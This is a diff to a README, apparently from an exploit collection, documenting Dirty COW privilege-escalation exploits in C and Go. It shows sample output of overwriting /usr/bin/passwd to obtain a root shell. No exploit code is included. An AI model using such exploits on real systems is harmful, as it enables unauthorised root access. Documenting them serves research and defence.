@@ -10,19 +10,19 @@ The [exploit](40616.c) defines some malicious shellcode, in Executable and Linka
 
 **Go**
 
-Go version of the[Dirty COW Race Condition Privilege Escalation
+Go version of the Dirty COW Race Condition Privilege Escalation
 
 ```sh
 alice@ubuntu $ go run dirty.go
 
-DirtyCow root privilege escalation
-Backing up /usr/bin/passwd.. to /tmp/bak
-Size of binary: 47032
-Racing, this may take a while...
-/usr/bin/passwd is overwritten
-Popping root shell
-procselfmem done
-Don't forget to restore /tmp/bak
+# DirtyCow root privilege escalation
+# Backing up /usr/bin/passwd.. to /tmp/bak
+# Size of binary: 47032
+# Racing, this may take a while...
+# /usr/bin/passwd is overwritten
+# Popping root shell
+# procselfmem done
+# Do not forget to restore /tmp/bak
 
 root@ubuntu:/home/alice $ id
 uid=0(root) gid=1000(alice) groups=0(root),4(adm),1000(alice)
